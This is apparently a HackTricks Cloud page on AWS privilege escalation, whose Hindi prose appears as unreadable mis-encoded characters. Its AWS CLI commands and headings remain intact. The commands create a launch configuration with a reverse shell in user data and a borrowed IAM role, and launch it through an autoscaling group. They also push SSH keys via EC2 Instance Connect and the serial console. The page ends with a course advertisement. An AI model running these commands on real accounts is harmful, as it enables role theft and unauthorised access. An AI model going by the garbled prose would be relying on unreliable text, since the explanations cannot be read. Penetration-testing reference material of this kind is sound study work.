рдЬрд┐рди рд╣рдорд▓рд╛рд╡рд░реЛрдВ рдХреЗ рдкрд╛рд╕ **`autoscaling:CreateLaunchConfiguration`,`autoscaling:CreateAutoScalingGroup`,`iam:PassRole`** рдЕрдиреБрдорддрд┐рдпрд╛рдВ рд╣реЛрддреА рд╣реИрдВ, рд╡реЗ **Launch Configuration рдмрдирд╛ рд╕рдХрддреЗ рд╣реИрдВ** рдЬрд┐рд╕рдореЗрдВ рдПрдХ **IAM Role** рдФрд░ **user data** рдореЗрдВ рдПрдХ **rev shell** рд╣реЛрддрд╛ рд╣реИ, рдлрд┐рд░ рдЙрд╕ config рд╕реЗ рдПрдХ **autoscaling group рдмрдирд╛ рд╕рдХрддреЗ рд╣реИрдВ** рдФрд░ rev shell рдХрд╛ рдЗрдВрддрдЬрд╛рд░ рдХрд░ рд╕рдХрддреЗ рд╣реИрдВ рддрд╛рдХрд┐ **IAM Role рдЪреБрд░рд╛ рд╕рдХреЗрдВ**ред
```bash
aws --profile "$NON_PRIV_PROFILE_USER" autoscaling create-launch-configuration \
--launch-configuration-name bad_config \
--image-id ami-0c1bc246476a5572b \
--instance-type t3.micro \
--iam-instance-profile EC2-CloudWatch-Agent-Role \
--user-data "$REV"

aws --profile "$NON_PRIV_PROFILE_USER" autoscaling create-auto-scaling-group \
--auto-scaling-group-name bad_auto \
--min-size 1 --max-size 1 \
--launch-configuration-name bad_config \
--desired-capacity 1 \
--vpc-zone-identifier "subnet-e282f9b8"
```
**рд╕рдВрднрд╛рд╡рд┐рдд рдкреНрд░рднрд╛рд╡:** рдПрдХ рдЕрд▓рдЧ EC2 рднреВрдорд┐рдХрд╛ рдХреЗ рд▓рд┐рдП рд╕реАрдзрд╛ privescред

### `!autoscaling`

рдЕрдиреБрдорддрд┐рдпреЛрдВ рдХрд╛ рд╕реЗрдЯ **`ec2:CreateLaunchTemplate`** рдФрд░ **`autoscaling:CreateAutoScalingGroup`** **рдЕрдзрд┐рдХрд╛рд░реЛрдВ рдХреЛ рдмрдврд╝рд╛рдиреЗ рдХреЗ рд▓рд┐рдП рдкрд░реНрдпрд╛рдкреНрдд рдирд╣реАрдВ рд╣реИрдВ** рдХреНрдпреЛрдВрдХрд┐ Launch Configuration рдпрд╛ Launch Template рдореЗрдВ рдирд┐рд░реНрджрд┐рд╖реНрдЯ IAM рднреВрдорд┐рдХрд╛ рдХреЛ рд╕рдВрд▓рдЧреНрди рдХрд░рдиреЗ рдХреЗ рд▓рд┐рдП **рдЖрдкрдХреЛ рдЕрдиреБрдорддрд┐рдпрд╛рдБ `iam:PassRole` рдФрд░ `ec2:RunInstances` рдХреА рдЖрд╡рд╢реНрдпрдХрддрд╛ рд╣реЛрддреА рд╣реИ** (рдЬреЛ рдХрд┐ рдПрдХ рдЬреНрдЮрд╛рдд privesc рд╣реИ)ред

### `ec2-instance-connect:SendSSHPublicKey`

рдПрдХ рд╣рдорд▓рд╛рд╡рд░ рдЬрд┐рд╕рдХреЗ рдкрд╛рд╕ **`ec2-instance-connect:SendSSHPublicKey`** рдЕрдиреБрдорддрд┐ рд╣реИ, рд╡рд╣ рдПрдХ рдЙрдкрдпреЛрдЧрдХрд░реНрддрд╛ рдХреЗ рд▓рд┐рдП ssh рдХреБрдВрдЬреА рдЬреЛрдбрд╝ рд╕рдХрддрд╛ рд╣реИ рдФрд░ рдЗрд╕рдХрд╛ рдЙрдкрдпреЛрдЧ рдХрд░рдХреЗ рдЙрд╕ рддрдХ рдкрд╣реБрдБрдЪ рд╕рдХрддрд╛ рд╣реИ (рдпрджрд┐ рдЙрд╕рдХреЗ рдкрд╛рд╕ рдЙрджрд╛рд╣рд░рдг рдХреЗ рд▓рд┐рдП ssh рдкрд╣реБрдБрдЪ рд╣реИ) рдпрд╛ рдЕрдзрд┐рдХрд╛рд░реЛрдВ рдХреЛ рдмрдврд╝рд╛ рд╕рдХрддрд╛ рд╣реИред
```bash
aws ec2-instance-connect send-ssh-public-key \
--instance-id "$INSTANCE_ID" \
--instance-os-user "ec2-user" \
--ssh-public-key "file://$PUBK_PATH"
```
**рд╕рдВрднрд╛рд╡рд┐рдд рдкреНрд░рднрд╛рд╡:** EC2 IAM рднреВрдорд┐рдХрд╛рдУрдВ рдХреЗ рд╕рд╛рде рдЪрд▓ рд░рд╣реЗ рдЙрджрд╛рд╣рд░рдгреЛрдВ рдХреЗ рд▓рд┐рдП рд╕реАрдзрд╛ privescред

### `ec2-instance-connect:SendSerialConsoleSSHPublicKey`

рдПрдХ рд╣рдорд▓рд╛рд╡рд░ рдЬрд┐рд╕рдХреЗ рдкрд╛рд╕ **`ec2-instance-connect:SendSerialConsoleSSHPublicKey`** рдЕрдиреБрдорддрд┐ рд╣реИ, рд╡рд╣ **рдПрдХ рд╕реАрд░рд┐рдпрд▓ рдХрдиреЗрдХреНрд╢рди рдореЗрдВ ssh рдХреБрдВрдЬреА рдЬреЛрдбрд╝ рд╕рдХрддрд╛ рд╣реИ**ред рдпрджрд┐ рд╕реАрд░рд┐рдпрд▓ рд╕рдХреНрд╖рдо рдирд╣реАрдВ рд╣реИ, рддреЛ рд╣рдорд▓рд╛рд╡рд░ рдХреЛ рдЗрд╕реЗ рд╕рдХреНрд╖рдо рдХрд░рдиреЗ рдХреЗ рд▓рд┐рдП **`ec2:EnableSerialConsoleAccess` рдЕрдиреБрдорддрд┐ рдХреА рдЖрд╡рд╢реНрдпрдХрддрд╛ рд╣реЛрддреА рд╣реИ**ред

рд╕реАрд░рд┐рдпрд▓ рдкреЛрд░реНрдЯ рд╕реЗ рдЬреБрдбрд╝рдиреЗ рдХреЗ рд▓рд┐рдП рдЖрдкрдХреЛ рдорд╢реАрди рдХреЗ рдЕрдВрджрд░ рдХреЗ рдПрдХ рдЙрдкрдпреЛрдЧрдХрд░реНрддрд╛ рдХрд╛ **рдЙрдкрдпреЛрдЧрдХрд░реНрддрд╛ рдирд╛рдо рдФрд░ рдкрд╛рд╕рд╡рд░реНрдб рднреА рдЬрд╛рдирдирд╛ рдЖрд╡рд╢реНрдпрдХ рд╣реИ**ред

{% code overflow="wrap" %}
```bash
aws ec2 enable-serial-console-access

aws ec2-instance-connect send-serial-console-ssh-public-key \
--instance-id "$INSTANCE_ID" \
--serial-port 0 \
--region "eu-west-1" \
--ssh-public-key "file://$PUBK_PATH"

ssh -i /tmp/priv $INSTANCE_ID.port0@serial-console.ec2-instance-connect.eu-west-1.aws
```
{% endcode %}

рдпрд╣ рддрд░реАрдХрд╛ privesc рдХреЗ рд▓рд┐рдП рдЙрддрдирд╛ рдЙрдкрдпреЛрдЧреА рдирд╣реАрдВ рд╣реИ рдХреНрдпреЛрдВрдХрд┐ рдЗрд╕рдХрд╛ рдлрд╛рдпрджрд╛ рдЙрдард╛рдиреЗ рдХреЗ рд▓рд┐рдП рдЖрдкрдХреЛ рдПрдХ рдЙрдкрдпреЛрдЧрдХрд░реНрддрд╛ рдирд╛рдо рдФрд░ рдкрд╛рд╕рд╡рд░реНрдб рдХрд╛ рдкрддрд╛ рд╣реЛрдирд╛ рдЪрд╛рд╣рд┐рдПред

**рд╕рдВрднрд╛рд╡рд┐рдд рдкреНрд░рднрд╛рд╡:** (рдЕрддреНрдпрдзрд┐рдХ рдЕрд╕рдВрднрд╛рд╡реНрдп) рд╕реАрдзреЗ EC2 IAM рднреВрдорд┐рдХрд╛рдУрдВ рдХреЗ рдкреНрд░рд┐рд╡реЗрд╕реНрдХ рдЬреЛ рдЪрд▓ рд░рд╣реЗ рдЙрджрд╛рд╣рд░рдгреЛрдВ рд╕реЗ рдЬреБрдбрд╝реЗ рд╣реБрдП рд╣реИрдВред

<details>

<summary><strong>рд╢реВрдиреНрдп рд╕реЗ рдирд╛рдпрдХ рддрдХ AWS рд╣реИрдХрд┐рдВрдЧ рд╕реАрдЦреЗрдВ</strong> <a href="https://training.hacktricks.xyz/courses/arte"><strong>htARTE (HackTricks AWS Red Team Expert)</strong></a><strong> рдХреЗ рд╕рд╛рде!</strong></summary>

HackTricks рдХрд╛ рд╕рдорд░реНрдерди рдХрд░рдиреЗ рдХреЗ рдЕрдиреНрдп рддрд░реАрдХреЗ:

* рдпрджрд┐ рдЖрдк рдЪрд╛рд╣рддреЗ рд╣реИрдВ рдХрд┐ рдЖрдкрдХреА **рдХрдВрдкрдиреА рдХрд╛ рд╡рд┐рдЬреНрдЮрд╛рдкрди HackTricks рдореЗрдВ рджрд┐рдЦрд╛рдИ рджреЗ** рдпрд╛ **HackTricks рдХреЛ PDF рдореЗрдВ рдбрд╛рдЙрдирд▓реЛрдб рдХрд░реЗрдВ**, рддреЛ [**рд╕рдмреНрд╕рдХреНрд░рд┐рдкреНрд╢рди рдкреНрд▓рд╛рдиреНрд╕**](https://github.com/sponsors/carlospolop) рджреЗрдЦреЗрдВ!
* [**рдЖрдзрд┐рдХрд╛рд░рд┐рдХ PEASS & HackTricks рд╕реНрд╡реИрдЧ**](https://peass.creator-spring.com) рдкреНрд░рд╛рдкреНрдд рдХрд░реЗрдВ
* [**The PEASS Family**](https://opensea.io/collection/the-peass-family) рдХреА рдЦреЛрдЬ рдХрд░реЗрдВ, рд╣рдорд╛рд░рд╛ рд╡рд┐рд╢реЗрд╖ [**NFTs**](https://opensea.io/collection/the-peass-family) рд╕рдВрдЧреНрд░рд╣
* ЁЯТм [**Discord group**](https://discord.gg/hRep4RUj7f) рдореЗрдВ **рд╢рд╛рдорд┐рд▓ рд╣реЛрдВ** рдпрд╛ [**telegram group**](https://t.me/peass) рдореЗрдВ рдпрд╛ **Twitter** ЁЯРж рдкрд░ **рдореБрдЭреЗ рдлреЙрд▓реЛ** рдХрд░реЗрдВ [**@carlospolopm**](https://twitter.com/carlospolopm)**.**
* **HackTricks** рдХреЗ [**github repos**](https://github.com/carlospolop/hacktricks) рдФрд░ [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) рдореЗрдВ PRs рд╕рдмрдорд┐рдЯ рдХрд░рдХреЗ рдЕрдкрдиреА рд╣реИрдХрд┐рдВрдЧ рдЯреНрд░рд┐рдХреНрд╕ рд╕рд╛рдЭрд╛ рдХрд░реЗрдВред

</details>
